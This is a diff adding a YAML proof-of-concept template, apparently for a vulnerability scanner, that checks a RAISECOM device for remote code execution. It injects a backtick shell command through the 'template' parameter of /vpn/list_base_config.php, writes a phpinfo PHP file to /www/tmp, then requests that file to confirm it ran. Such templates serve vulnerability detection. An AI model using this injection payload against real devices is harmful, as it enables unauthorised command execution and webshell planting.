@@ -1,0 +1,29 @@
+name: poc-yaml-RAISECOM-list_base_config-rce
+transport: http
+
+set:
+  username: randomLowercase(6)
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2F{{username}}.php%60
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 
+
+  r1:
+    request:
+      method: GET
+      path: /tmp/{{username}}.php
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'PHP Version') && response.body.bcontains(b'phpinfo()')
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/140826601
